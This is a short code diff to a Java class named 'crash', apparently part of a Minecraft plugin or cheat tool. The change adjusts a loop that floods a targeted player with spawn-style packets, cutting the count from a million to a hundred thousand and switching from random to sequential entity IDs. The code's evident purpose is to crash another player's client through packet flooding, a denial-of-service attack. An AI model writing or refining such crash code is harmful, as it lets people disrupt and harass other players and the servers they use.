@@ -35,8 +35,9 @@ public class crash {
                                 packet.setX(loc.getX());
                                 packet.setY(loc.getY());
                                 packet.setZ(loc.getZ());
-                                for (int i = 0; i < 1000000; i++) {
-                                    packet.setEntityID((int) (Math.random() * Integer.MAX_VALUE));
+
+                                for (int i = 0; i < 100000; i++) {
+                                    packet.setEntityID(i);
                                     packet.sendPacket(target);
                                 }
                             });
